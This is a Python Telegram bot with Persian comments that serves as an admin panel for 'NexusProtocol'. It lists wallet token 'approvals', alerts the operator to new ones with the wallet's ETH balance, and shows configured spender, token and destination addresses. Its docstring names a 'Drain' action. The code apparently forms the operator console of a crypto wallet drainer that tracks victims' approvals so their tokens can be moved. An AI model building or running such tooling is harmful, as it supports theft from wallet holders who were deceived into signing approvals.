#!/usr/bin/env python3
"""
NexusProtocol — پنل مدیریت تلگرام (نسخه کامل)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
امکانات:
  • منوی اصلی با دکمه‌های Inline
  • آمار کامل (کل / در انتظار / پردازش‌شده)
  • لیست approvals با pagination + دکمه جزئیات هر ردیف
  • جزئیات کامل یک approval + دکمه‌های عمل (تأیید / رد / Drain)
  • وضعیت سرویس‌ها (API / BOT / WEB)
  • قیمت لحظه‌ای ETH + تبدیل ارزی
  • Gas Price شبکه اتریوم
  • جستجو با آدرس کیف پول (/search)
  • تنظیمات (SPENDER / TOKEN / DESTINATION)
  • اعلان خودکار approval جدید با دکمه‌های عمل
  • نگه‌داری سرویس Render (Keep-Alive)
  • deleteWebhook هنگام راه‌اندازی
  • بررسی مجوز در callback ها
  • لاگ دقیق خطاها
"""

import os, time, json, html, logging, threading, requests
from datetime import datetime, timezone, timedelta

logger = logging.getLogger("AdminPanel")

# ─── Config ───────────────────────────────────────────────────────────────────
BOT_TOKEN   = os.getenv("TELEGRAM_BOT_TOKEN", "")
ADMIN_CHAT  = os.getenv("TELEGRAM_CHAT_ID", "")
API_URL     = os.getenv("WEBSITE_URL", "https://nexusprotocol-api.onrender.com").rstrip("/")
WEB_URL     = "https://nexusprotocol-web.onrender.com"
BOT_SVC_URL = "https://nexusprotocol-bot.onrender.com"
SPENDER     = os.getenv("SPENDER_ADDRESS", "")
DESTINATION = os.getenv("DESTINATION_ADDRESS", "")
RPC_URL     = os.getenv("RPC_URL", "https://eth.llamarpc.com")
ETH_SCAN    = "https://etherscan.io"

TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

_start_time             = datetime.now(timezone.utc)
_seen_approval_ids: set = set()
_lock                   = threading.Lock()


# ═══════════════════════════════════════════════════════════════════════════════
# ─── Telegram helpers ─────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def tg_send(chat_id: str, text: str, reply_markup=None) -> dict:
    if not BOT_TOKEN:
        return {}
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        r = requests.post(f"{TG_API}/sendMessage", json=payload, timeout=10)
        return r.json()
    except Exception as e:
        logger.error(f"tg_send error: {e}")
        return {}


def tg_answer_callback(callback_id: str, text: str = "", alert: bool = False):
    try:
        requests.post(
            f"{TG_API}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": text, "show_alert": alert},
            timeout=5,
        )
    except Exception:
        pass


def tg_edit(chat_id: str, message_id: int, text: str, reply_markup=None):
    payload = {
        "chat_id":    chat_id,
        "message_id": message_id,
        "text":       text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(f"{TG_API}/editMessageText", json=payload, timeout=10)
    except Exception:
        pass


def tg_delete(chat_id: str, message_id: int):
    try:
        requests.post(f"{TG_API}/deleteMessage",
                      json={"chat_id": chat_id, "message_id": message_id}, timeout=5)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════════════════
# ─── Inline keyboards ─────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def main_kb():
    return {"inline_keyboard": [
        [
            {"text": "📊 آمار کلی",      "callback_data": "stats"},
            {"text": "🖥️ وضعیت سرویس",  "callback_data": "status"},
        ],
        [
            {"text": "🔔 همه Approvals", "callback_data": "approvals_0"},
            {"text": "⏳ در انتظار",     "callback_data": "pending_0"},
        ],
        [
            {"text": "💰 قیمت ETH",      "callback_data": "ethprice"},
            {"text": "⛽ Gas Price",      "callback_data": "gasprice"},
        ],
        [
            {"text": "⚙️ تنظیمات",       "callback_data": "config"},
            {"text": "❓ راهنما",         "callback_data": "help"},
        ],
        [{"text": "🔄 بروزرسانی",        "callback_data": "main"}],
    ]}


def back_kb():
    return {"inline_keyboard": [
        [{"text": "🏠 منوی اصلی", "callback_data": "main"}],
        [{"text": "🔄 بروزرسانی", "callback_data": "refresh"}],
    ]}


def approval_action_kb(approval_id: str):
    """کیبورد عملیات روی یک approval خاص"""
    short = approval_id[:8]  # برای نمایش کوتاه‌تر
    return {"inline_keyboard": [
        [
            {"text": "✅ تأیید / Mark Processed", "callback_data": f"proc_{approval_id}"},
        ],
        [
            {"text": "⏭️ رد / Skip",              "callback_data": f"skip_{approval_id}"},
            {"text": "🔄 بروزرسانی",              "callback_data": f"detail_{approval_id}"},
        ],
        [
            {"text": "🔗 Etherscan کیف پول",      "callback_data": f"scan_{approval_id}"},
        ],
        [{"text": "◀️ بازگشت به لیست",            "callback_data": "approvals_0"}],
    ]}


def approvals_list_kb(items: list, page: int, prefix: str = "approvals"):
    """کیبورد لیست approvals با pagination"""
    rows = []
    for ap in items:
        aid  = ap.get("id", "")
        addr = ap.get("wallet_address") or ap.get("address") or ap.get("walletAddress", "???")
        short_addr = addr[:6] + "…" + addr[-4:] if len(addr) > 12 else addr
        amount = ap.get("amount") or ap.get("value") or "?"
        rows.append([
            {"text": f"📄 {short_addr} | {amount}", "callback_data": f"detail_{aid}"},
        ])
    # pagination
    nav = []
    if page > 0:
        nav.append({"text": "◀️ قبل", "callback_data": f"{prefix}_{page-1}"})
    nav.append({"text": "🏠", "callback_data": "main"})
    if len(items) == 5:  # اگر 5 آیتم نشان داده شد احتمالاً صفحه بعد هم هست
        nav.append({"text": "▶️ بعد", "callback_data": f"{prefix}_{page+1}"})
    rows.append(nav)
    return {"inline_keyboard": rows}


# ═══════════════════════════════════════════════════════════════════════════════
# ─── Data fetchers ────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def get_eth_price() -> float:
    try:
        r = requests.get(
            "https://api.coingecko.com/api/v3/simple/price"
            "?ids=ethereum&vs_currencies=usd,eur,gbp",
            timeout=6)
        data = r.json().get("ethereum", {})
        return data
    except Exception:
        return {"usd": 0, "eur": 0, "gbp": 0}


def get_eth_gas() -> dict:
    """Gas Price از RPC اتریوم"""
    try:
        payload = {"jsonrpc": "2.0", "method": "eth_gasPrice", "params": [], "id": 1}
        r = requests.post(RPC_URL, json=payload, timeout=6)
        hex_val = r.json().get("result", "0x0")
        gwei = int(hex_val, 16) / 1e9
        # try ethgasstation for more detail
        try:
            gs = requests.get("https://api.ethgasstation.info/api/fee-estimate", timeout=4).json()
            return {
                "slow":    round(gs.get("safeLow",  {}).get("maxFee", gwei * 0.8), 1),
                "normal":  round(gs.get("standard", {}).get("maxFee", gwei),       1),
                "fast":    round(gs.get("fast",     {}).get("maxFee", gwei * 1.2), 1),
                "instant": round(gs.get("fastest",  {}).get("maxFee", gwei * 1.5), 1),
            }
        except Exception:
            g = round(gwei, 1)
            return {"slow": round(g*0.8, 1), "normal": g, "fast": round(g*1.2, 1), "instant": round(g*1.5, 1)}
    except Exception:
        return {"slow": "?", "normal": "?", "fast": "?", "instant": "?"}


def check_service(url: str, path: str = "/") -> tuple:
    try:
        r = requests.get(url + path, timeout=7)
        return r.status_code < 400, r.status_code
    except Exception:
        return False, 0


def get_all_approvals(limit: int = 100) -> list:
    """همه approvals (pending + processed)"""
    try:
        r = requests.get(f"{API_URL}/api/approvals", timeout=8)
        if r.status_code == 200:
            data = r.json()
            if isinstance(data, list):
                return data[:limit]
    except Exception:
        pass
    return []


def get_pending_approvals(limit: int = 50) -> list:
    """فقط approvals در انتظار"""
    for ep in ["/api/approvals/pending", "/api/approvals"]:
        try:
            r = requests.get(f"{API_URL}{ep}", timeout=8)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, list):
                    # اگر همه برگشتند، فقط pending را فیلتر کن
                    if ep == "/api/approvals":
                        data = [
                            a for a in data
                            if a.get("status", "pending") in ("pending", "PENDING", "", None)
                        ]
                    return data[:limit]
        except Exception:
            continue
    return []


def get_approval_by_id(approval_id: str) -> dict | None:
    """یک approval خاص با ID"""
    try:
        r = requests.get(f"{API_URL}/api/approvals/{approval_id}", timeout=8)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    # fallback: از لیست کامل پیدا کن
    for ap in get_all_approvals(200):
        if ap.get("id") == approval_id:
            return ap
    return None


def confirm_approval(approval_id: str) -> tuple[bool, str]:
    """تأیید / mark as processed"""
    for ep in [
        f"/api/approvals/confirm/{approval_id}",
        f"/api/approvals/{approval_id}/confirm",
    ]:
        try:
            r = requests.post(f"{API_URL}{ep}", timeout=8)
            if r.status_code in (200, 201, 204):
                return True, "✅ با موفقیت تأیید شد"
        except Exception:
            continue
    return False, "❌ خطا در تأیید"


def search_approvals(query: str) -> list:
    """جستجو در approvals با آدرس کیف پول"""
    query = query.lower().strip()
    results = []
    for ap in get_all_approvals(200):
        addr = (ap.get("wallet_address") or ap.get("address") or
                ap.get("walletAddress") or "").lower()
        owner = (ap.get("owner") or "").lower()
        if query in addr or query in owner:
            results.append(ap)
    return results[:20]


def get_eth_balance(address: str) -> float:
    """موجودی ETH یک آدرس"""
    try:
        payload = {
            "jsonrpc": "2.0",
            "method": "eth_getBalance",
            "params": [address, "latest"],
            "id": 1,
        }
        r = requests.post(RPC_URL, json=payload, timeout=6)
        hex_val = r.json().get("result", "0x0")
        return int(hex_val, 16) / 1e18
    except Exception:
        return -1


# ═══════════════════════════════════════════════════════════════════════════════
# ─── Message builders ────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def build_main() -> str:
    uptime = datetime.now(timezone.utc) - _start_time
    h, rem = divmod(int(uptime.total_seconds()), 3600)
    m = rem // 60
    return (
        "🛡️ <b>NexusProtocol Admin Panel</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱️ آپ‌تایم: <code>{h}h {m}m</code>\n"
        f"📅 زمان: <code>{datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M')} UTC</code>\n\n"
        "یکی از گزینه‌ها را انتخاب کنید 👇"
    )


def build_status() -> str:
    api_ok, api_code = check_service(API_URL, "/api/healthz")
    bot_ok, bot_code = check_service(BOT_SVC_URL, "/health")
    web_ok, web_code = check_service(WEB_URL, "/")

    def icon(ok): return "🟢" if ok else "🔴"

    return (
        "🖥️ <b>وضعیت سرویس‌ها</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{icon(api_ok)} <b>API</b>: {'آنلاین' if api_ok else 'آفلاین'} "
        f"<code>({api_code})</code>\n"
        f"{icon(bot_ok)} <b>BOT</b>: {'آنلاین' if bot_ok else 'آفلاین'} "
        f"<code>({bot_code})</code>\n"
        f"{icon(web_ok)} <b>WEB</b>: {'آنلاین' if web_ok else 'آفلاین'} "
        f"<code>({web_code})</code>\n\n"
        f"🔗 <a href='{API_URL}/api/healthz'>API Health</a> | "
        f"<a href='{WEB_URL}'>Frontend</a>"
    )


def build_stats() -> str:
    all_ap   = get_all_approvals(500)
    pend_ap  = [a for a in all_ap
                if a.get("status", "pending") in ("pending", "PENDING", "", None)]
    proc_ap  = [a for a in all_ap if a not in pend_ap]

    total    = len(all_ap)
    pending  = len(pend_ap)
    processed= len(proc_ap)
    pct      = round(processed / total * 100) if total else 0

    # آمار مبلغ
    amounts = []
    for a in all_ap:
        try:
            v = float(a.get("amount") or a.get("value") or 0)
            amounts.append(v)
        except Exception:
            pass
    total_eth = sum(amounts)

    # progress bar
    bar_len  = 15
    filled   = int(bar_len * pct / 100)
    bar      = "█" * filled + "░" * (bar_len - filled)

    return (
        "📊 <b>آمار کلی NexusProtocol</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📋 کل Approvals:  <b>{total}</b>\n"
        f"⏳ در انتظار:     <b>{pending}</b>\n"
        f"✅ پردازش‌شده:   <b>{processed}</b>\n\n"
        f"[{bar}] {pct}%\n\n"
        f"💎 حجم کل: <b>{total_eth:.4f} ETH</b>\n"
        f"📅 آخر بروز: <code>{datetime.now(timezone.utc).strftime('%H:%M:%S')} UTC</code>"
    )


def build_approvals_page(page: int, prefix: str = "approvals") -> tuple[str, list]:
    """صفحه approval‌ها — برمی‌گرداند (متن، لیست)"""
    per_page = 5
    if prefix == "pending":
        source = get_pending_approvals(200)
        title  = "⏳ Approvals در انتظار"
    else:
        source = get_all_approvals(200)
        title  = "🔔 همه Approvals"

    start = page * per_page
    items = source[start: start + per_page]

    if not items:
        return f"{title}\n\n❌ هیچ موردی یافت نشد.", []

    lines = [f"{title} — صفحه {page+1}\n━━━━━━━━━━━━━━━━━━━━━━━"]
    for i, ap in enumerate(items, start + 1):
        addr   = ap.get("wallet_address") or ap.get("address") or ap.get("walletAddress") or "?"
        amount = ap.get("amount") or ap.get("value") or "?"
        status = ap.get("status") or "pending"
        ts     = ap.get("created_at") or ap.get("createdAt") or ""
        ts_str = ts[:16].replace("T", " ") if ts else "—"
        s_icon = "✅" if status in ("processed", "confirmed", "done") else "⏳"
        lines.append(
            f"\n{i}. {s_icon} <code>{addr[:10]}…</code>\n"
            f"   💎 {amount} | 📅 {ts_str}"
        )

    return "\n".join(lines), items


def build_approval_detail(ap: dict) -> str:
    """جزئیات کامل یک approval"""
    aid    = ap.get("id", "?")
    addr   = ap.get("wallet_address") or ap.get("address") or ap.get("walletAddress") or "?"
    owner  = ap.get("owner") or ""
    amount = ap.get("amount") or ap.get("value") or "?"
    token  = ap.get("token_address") or ap.get("tokenAddress") or ap.get("token") or "?"
    status = ap.get("status") or "pending"
    ts     = (ap.get("created_at") or ap.get("createdAt") or "")[:19].replace("T", " ")
    tx     = ap.get("tx_hash") or ap.get("txHash") or ap.get("transaction_hash") or ""

    s_icon = "✅" if status in ("processed", "confirmed", "done") else "⏳"
    eth_link = f"{ETH_SCAN}/address/{addr}"
    tx_link  = f"{ETH_SCAN}/tx/{tx}" if tx else ""

    lines = [
        f"📄 <b>جزئیات Approval</b>",
        "━━━━━━━━━━━━━━━━━━━━━━━",
        f"🆔 ID: <code>{aid[:20]}…</code>",
        f"{s_icon} وضعیت: <b>{status}</b>",
        f"",
        f"👛 آدرس کیف پول:",
        f"<code>{addr}</code>",
    ]
    if owner:
        lines.append(f"👤 Owner: <code>{owner}</code>")
    lines += [
        f"",
        f"💎 مقدار: <b>{amount}</b>",
        f"🪙 توکن: <code>{token[:20]}…</code>" if len(str(token)) > 20 else f"🪙 توکن: <code>{token}</code>",
        f"📅 زمان: <code>{ts}</code>",
    ]
    if tx:
        lines.append(f"📝 TX: <a href='{tx_link}'>{tx[:12]}…</a>")
    lines.append(f"\n🔗 <a href='{eth_link}'>مشاهده در Etherscan</a>")
    return "\n".join(lines)


def build_eth_price() -> str:
    prices = get_eth_price()
    usd = prices.get("usd", 0)
    eur = prices.get("eur", 0)
    gbp = prices.get("gbp", 0)
    return (
        "💰 <b>قیمت لحظه‌ای Ethereum</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🇺🇸 USD: <b>${usd:,.2f}</b>\n"
        f"🇪🇺 EUR: <b>€{eur:,.2f}</b>\n"
        f"🇬🇧 GBP: <b>£{gbp:,.2f}</b>\n\n"
        f"📅 <code>{datetime.now(timezone.utc).strftime('%H:%M:%S')} UTC</code>\n"
        "📊 منبع: CoinGecko"
    )


def build_gas() -> str:
    gas = get_eth_gas()
    return (
        "⛽ <b>Gas Price شبکه اتریوم</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🐢 کند:    <b>{gas['slow']} Gwei</b>\n"
        f"🚶 نرمال:  <b>{gas['normal']} Gwei</b>\n"
        f"🏃 سریع:   <b>{gas['fast']} Gwei</b>\n"
        f"⚡ فوری:   <b>{gas['instant']} Gwei</b>\n\n"
        f"📅 <code>{datetime.now(timezone.utc).strftime('%H:%M:%S')} UTC</code>"
    )


def build_config() -> str:
    try:
        r = requests.get(f"{API_URL}/api/config", timeout=6)
        cfg = r.json() if r.status_code == 200 else {}
    except Exception:
        cfg = {}
    spender = cfg.get("spender") or SPENDER or "تنظیم نشده"
    token   = cfg.get("token")   or "تنظیم نشده"
    dst     = DESTINATION        or "تنظیم نشده"

    def shorten(addr):
        return f"{addr[:8]}…{addr[-6:]}" if len(addr) > 16 else addr

    return (
        "⚙️ <b>تنظیمات سیستم</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 Spender:\n<code>{shorten(spender)}</code>\n"
        f"\n🪙 Token Contract:\n<code>{shorten(token)}</code>\n"
        f"\n🎯 Destination:\n<code>{shorten(dst)}</code>\n"
        f"\n🌐 RPC: <code>{RPC_URL[:40]}</code>\n"
        f"\n🔗 <a href='{ETH_SCAN}/address/{spender}'>Spender در Etherscan</a>"
    )


def build_help() -> str:
    return (
        "❓ <b>راهنمای دستورات</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "/start — منوی اصلی\n"
        "/status — وضعیت سرویس‌ها\n"
        "/stats — آمار کلی\n"
        "/approvals — لیست همه Approvals\n"
        "/pending — Approvals در انتظار\n"
        "/search &lt;آدرس&gt; — جستجو با آدرس کیف پول\n"
        "/gas — Gas Price اتریوم\n"
        "/price — قیمت ETH\n"
        "/config — تنظیمات سیستم\n"
        "/help — این راهنما\n"
        "\n━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📌 دکمه‌های Inline:\n"
        "• <b>📄 تأیید</b> — Approval را Processed می‌کند\n"
        "• <b>⏭️ رد</b> — از این Approval صرف‌نظر می‌کند\n"
        "• <b>🔗 Etherscan</b> — کیف پول را در Etherscan باز می‌کند"
    )


def build_search_results(items: list, query: str) -> str:
    if not items:
        return f"🔍 جستجو برای <code>{html.escape(query)}</code>\n\n❌ نتیجه‌ای یافت نشد."
    lines = [
        f"🔍 نتایج جستجو برای <code>{html.escape(query)}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"تعداد: <b>{len(items)}</b> مورد\n"
    ]
    for ap in items[:10]:
        addr   = ap.get("wallet_address") or ap.get("address") or "?"
        amount = ap.get("amount") or ap.get("value") or "?"
        status = ap.get("status") or "pending"
        s_icon = "✅" if status in ("processed", "confirmed", "done") else "⏳"
        lines.append(f"{s_icon} <code>{addr[:14]}…</code> | {amount}")
    return "\n".join(lines)


def build_notification(ap: dict) -> str:
    """متن اعلان برای approval جدید"""
    addr   = ap.get("wallet_address") or ap.get("address") or ap.get("walletAddress") or "?"
    amount = ap.get("amount") or ap.get("value") or "?"
    token  = ap.get("token_address") or ap.get("tokenAddress") or ap.get("token") or "?"
    ts     = (ap.get("created_at") or ap.get("createdAt") or "")[:19].replace("T", " ")
    eth_link = f"{ETH_SCAN}/address/{addr}"

    # تلاش برای دریافت موجودی ETH
    try:
        bal = get_eth_balance(addr)
        bal_str = f"{bal:.4f} ETH" if bal >= 0 else "نامعلوم"
    except Exception:
        bal_str = "نامعلوم"

    return (
        "🚨 <b>Approval جدید شناسایی شد!</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👛 آدرس:\n<code>{addr}</code>\n"
        f"💎 مقدار: <b>{amount}</b>\n"
        f"🏦 موجودی ETH: <b>{bal_str}</b>\n"
        f"🪙 توکن: <code>{str(token)[:20]}</code>\n"
        f"📅 زمان: <code>{ts}</code>\n"
        f"🔗 <a href='{eth_link}'>مشاهده در Etherscan</a>"
    )


# ═══════════════════════════════════════════════════════════════════════════════
# ─── Notification logic ───────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _notify_new_approvals():
    """بررسی approval جدید و ارسال اعلان"""
    if not ADMIN_CHAT:
        return
    try:
        approvals = get_pending_approvals(100)
        with _lock:
            new_ones = [a for a in approvals if a.get("id") not in _seen_approval_ids]
        for ap in new_ones:
            aid = ap.get("id")
            if not aid:
                continue
            text   = build_notification(ap)
            # کیبورد با دکمه‌های عمل
            kb = {"inline_keyboard": [
                [{"text": "✅ تأیید",  "callback_data": f"proc_{aid}"},
                 {"text": "⏭️ رد",    "callback_data": f"skip_{aid}"}],
                [{"text": "📄 جزئیات", "callback_data": f"detail_{aid}"}],
            ]}
            tg_send(ADMIN_CHAT, text, kb)
            with _lock:
                _seen_approval_ids.add(aid)
    except Exception as e:
        logger.error(f"_notify_new_approvals error: {e}")


# ═══════════════════════════════════════════════════════════════════════════════
# ─── Message / callback handlers ─────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def handle_message(msg: dict):
    chat_id = str(msg.get("chat", {}).get("id", ""))
    text    = msg.get("text", "").strip()

    # بررسی مجوز
    if ADMIN_CHAT and chat_id != ADMIN_CHAT:
        tg_send(chat_id, "⛔ دسترسی مجاز نیست.")
        return

    cmd = text.split()[0].lower().lstrip("/").split("@")[0]
    args = text.split()[1:] if len(text.split()) > 1 else []

    if cmd in ("start", "menu"):
        tg_send(chat_id, build_main(), main_kb())

    elif cmd == "status":
        tg_send(chat_id, "⏳ در حال بررسی سرویس‌ها…")
        tg_send(chat_id, build_status(), back_kb())

    elif cmd == "stats":
        tg_send(chat_id, "⏳ در حال دریافت آمار…")
        tg_send(chat_id, build_stats(), back_kb())

    elif cmd == "approvals":
        txt, items = build_approvals_page(0, "approvals")
        tg_send(chat_id, txt, approvals_list_kb(items, 0, "approvals"))

    elif cmd == "pending":
        txt, items = build_approvals_page(0, "pending")
        tg_send(chat_id, txt, approvals_list_kb(items, 0, "pending"))

    elif cmd == "config":
        tg_send(chat_id, build_config(), back_kb())

    elif cmd in ("gas", "gasprice"):
        tg_send(chat_id, "⏳ در حال دریافت Gas Price…")
        tg_send(chat_id, build_gas(), back_kb())

    elif cmd in ("price", "ethprice", "eth"):
        tg_send(chat_id, "⏳ در حال دریافت قیمت…")
        tg_send(chat_id, build_eth_price(), back_kb())

    elif cmd == "help":
        tg_send(chat_id, build_help(), back_kb())

    elif cmd == "search":
        if not args:
            tg_send(chat_id, "❓ استفاده: /search &lt;آدرس کیف پول&gt;")
            return
        query = args[0]
        tg_send(chat_id, f"🔍 در حال جستجو: <code>{html.escape(query)}</code>…")
        results = search_approvals(query)
        txt = build_search_results(results, query)
        if results:
            tg_send(chat_id, txt, approvals_list_kb(results[:5], 0, "approvals"))
        else:
            tg_send(chat_id, txt, back_kb())

    else:
        tg_send(chat_id, "❓ دستور ناشناخته. از /help برای راهنما استفاده کنید.", back_kb())


def handle_callback(cb: dict):
    cb_id   = cb.get("id", "")
    chat_id = str(cb.get("message", {}).get("chat", {}).get("id", ""))
    msg_id  = cb.get("message", {}).get("message_id")
    data    = cb.get("data", "")

    # بررسی مجوز
    if ADMIN_CHAT and chat_id != ADMIN_CHAT:
        tg_answer_callback(cb_id, "⛔ دسترسی مجاز نیست", alert=True)
        return

    tg_answer_callback(cb_id)

    if not chat_id or not msg_id:
        return

    # ─── منوی اصلی / بروزرسانی ───
    if data in ("main", "refresh"):
        tg_edit(chat_id, msg_id, build_main(), main_kb())

    # ─── آمار ───
    elif data == "stats":
        tg_edit(chat_id, msg_id, "⏳ در حال دریافت آمار…")
        tg_edit(chat_id, msg_id, build_stats(), back_kb())

    # ─── وضعیت ───
    elif data == "status":
        tg_edit(chat_id, msg_id, "⏳ در حال بررسی…")
        tg_edit(chat_id, msg_id, build_status(), back_kb())

    # ─── قیمت ETH ───
    elif data == "ethprice":
        tg_edit(chat_id, msg_id, "⏳ در حال دریافت قیمت…")
        tg_edit(chat_id, msg_id, build_eth_price(), back_kb())

    # ─── Gas Price ───
    elif data == "gasprice":
        tg_edit(chat_id, msg_id, "⏳ در حال دریافت Gas Price…")
        tg_edit(chat_id, msg_id, build_gas(), back_kb())

    # ─── تنظیمات ───
    elif data == "config":
        tg_edit(chat_id, msg_id, build_config(), back_kb())

    # ─── راهنما ───
    elif data == "help":
        tg_edit(chat_id, msg_id, build_help(), back_kb())

    # ─── لیست همه Approvals ───
    elif data.startswith("approvals_"):
        try:
            page = int(data.split("_", 1)[1])
        except ValueError:
            page = 0
        txt, items = build_approvals_page(page, "approvals")
        tg_edit(chat_id, msg_id, txt, approvals_list_kb(items, page, "approvals"))

    # ─── لیست Pending ───
    elif data.startswith("pending_"):
        try:
            page = int(data.split("_", 1)[1])
        except ValueError:
            page = 0
        txt, items = build_approvals_page(page, "pending")
        tg_edit(chat_id, msg_id, txt, approvals_list_kb(items, page, "pending"))

    elif data == "pending":
        txt, items = build_approvals_page(0, "pending")
        tg_edit(chat_id, msg_id, txt, approvals_list_kb(items, 0, "pending"))

    # ─── جزئیات یک Approval ───
    elif data.startswith("detail_"):
        aid = data[7:]
        tg_edit(chat_id, msg_id, "⏳ در حال دریافت اطلاعات…")
        ap = get_approval_by_id(aid)
        if ap:
            tg_edit(chat_id, msg_id, build_approval_detail(ap), approval_action_kb(aid))
        else:
            tg_edit(chat_id, msg_id, "❌ Approval پیدا نشد.", back_kb())

    # ─── تأیید Approval ───
    elif data.startswith("proc_"):
        aid = data[5:]
        tg_answer_callback(cb_id, "⏳ در حال تأیید…")
        ok, msg_txt = confirm_approval(aid)
        if ok:
            tg_edit(chat_id, msg_id,
                    f"✅ <b>Approval تأیید شد</b>\n<code>{aid[:20]}…</code>",
                    back_kb())
        else:
            tg_edit(chat_id, msg_id,
                    f"❌ <b>خطا در تأیید</b>\n<code>{aid[:20]}…</code>\n{msg_txt}",
                    approval_action_kb(aid))

    # ─── رد Approval ───
    elif data.startswith("skip_"):
        aid = data[5:]
        tg_edit(chat_id, msg_id,
                f"⏭️ <b>Approval رد شد</b>\n<code>{aid[:20]}…</code>",
                back_kb())

    # ─── Etherscan برای Approval ───
    elif data.startswith("scan_"):
        aid = data[5:]
        ap = get_approval_by_id(aid)
        if ap:
            addr = ap.get("wallet_address") or ap.get("address") or ap.get("walletAddress") or ""
            link = f"{ETH_SCAN}/address/{addr}"
            tg_edit(chat_id, msg_id,
                    f"🔗 <a href='{link}'>مشاهده {addr[:14]}… در Etherscan</a>",
                    approval_action_kb(aid))
        else:
            tg_answer_callback(cb_id, "❌ Approval پیدا نشد", alert=True)

    else:
        tg_answer_callback(cb_id, "❓ دستور ناشناخته")


# ═══════════════════════════════════════════════════════════════════════════════
# ─── Keep-alive & polling ─────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _keep_alive():
    """هر ۱۴ دقیقه سرویس رو پینگ می‌کنه تا Render free-tier نخوابه"""
    while True:
        time.sleep(14 * 60)
        try:
            requests.get(BOT_SVC_URL + "/health", timeout=10)
            logger.debug("Keep-alive ping sent")
        except Exception:
            pass


def _polling_loop():
    if not BOT_TOKEN:
        logger.error("❌ TELEGRAM_BOT_TOKEN not set — admin panel disabled")
        return

    # حذف webhook قدیمی — بدون این، polling هرگز پیام نمی‌گیره
    try:
        dw_res = requests.post(
            f"{TG_API}/deleteWebhook",
            json={"drop_pending_updates": False},
            timeout=10,
        )
        logger.info(f"✅ deleteWebhook: {dw_res.json()}")
    except Exception as exc:
        logger.warning(f"deleteWebhook failed: {exc}")

    logger.info("📱 Admin Panel polling started")
    offset     = 0
    last_notify = 0

    # Keep-alive thread — جلوگیری از خواب Render free-tier
    threading.Thread(target=_keep_alive, daemon=True, name="KeepAlive").start()

    # تنظیم commands در تلگرام
    try:
        cmds = [
            {"command": "start",     "description": "🏠 منوی اصلی"},
            {"command": "status",    "description": "🖥️ وضعیت سرویس‌ها"},
            {"command": "stats",     "description": "📊 آمار کلی"},
            {"command": "approvals", "description": "🔔 همه Approvals"},
            {"command": "pending",   "description": "⏳ در انتظار پردازش"},
            {"command": "search",    "description": "🔍 جستجو با آدرس"},
            {"command": "gas",       "description": "⛽ Gas Price اتریوم"},
            {"command": "price",     "description": "💰 قیمت ETH"},
            {"command": "config",    "description": "⚙️ تنظیمات سیستم"},
            {"command": "help",      "description": "❓ راهنما"},
        ]
        requests.post(f"{TG_API}/setMyCommands",
                      json={"commands": cmds}, timeout=10)
        logger.info("✅ Telegram commands set")
    except Exception as e:
        logger.warning(f"setMyCommands failed: {e}")

    while True:
        try:
            r = requests.get(
                f"{TG_API}/getUpdates",
                params={"offset": offset, "timeout": 20, "limit": 50},
                timeout=25,
            )
            if r.status_code != 200:
                logger.error(f"getUpdates HTTP {r.status_code}: {r.text[:300]}")
                time.sleep(5)
                continue

            updates = r.json().get("result", [])
            for upd in updates:
                offset = upd["update_id"] + 1
                if "message" in upd:
                    threading.Thread(
                        target=handle_message, args=(upd["message"],), daemon=True
                    ).start()
                elif "callback_query" in upd:
                    threading.Thread(
                        target=handle_callback, args=(upd["callback_query"],), daemon=True
                    ).start()

            # اعلان approval جدید هر ۳۰ ثانیه
            now = time.time()
            if now - last_notify >= 30:
                threading.Thread(target=_notify_new_approvals, daemon=True).start()
                last_notify = now

        except requests.exceptions.Timeout:
            pass  # normal — long polling timed out
        except Exception as e:
            logger.error(f"Polling error: {e}")
            time.sleep(5)


def start_admin_panel():
    """در یک daemon thread راه‌اندازی می‌شود"""
    t = threading.Thread(target=_polling_loop, daemon=True, name="AdminPanel")
    t.start()
    logger.info("🚀 Admin Panel thread started")
    return t


# ─── Standalone run ───────────────────────────────────────────────────────────
if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )
    logger.info("Running admin panel standalone...")
    _polling_loop()   # block in main thread
